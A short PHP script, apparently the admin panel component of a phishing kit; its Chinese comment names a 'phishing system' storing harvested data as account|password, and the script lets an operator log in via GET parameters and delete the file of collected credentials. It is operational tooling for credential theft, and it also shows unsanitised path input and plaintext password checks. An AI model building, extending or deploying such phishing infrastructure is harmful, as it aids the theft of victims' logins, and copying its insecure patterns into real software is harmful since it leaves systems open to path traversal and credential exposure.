<?php
$user=$_GET['user'];
$pass=$_GET['pass'];
require 'test_test.php';
//钓鱼系统格式:[账号|密码]
if(is_dir('userss/'.$user)&&$user!=''){
if($pass==file_get_contents('userss/'.$user.'/admin/passprotect556')){
if(file_exists('userss/'.$user.'/admin/data/fishing')){
unlink('userss/'.$user.'/admin/data/fishing');
echo '清空成功';
}else{echo '暂无账号数据';}
}else{echo '密码错误';}
}else{echo '后台账号不存在';}
?>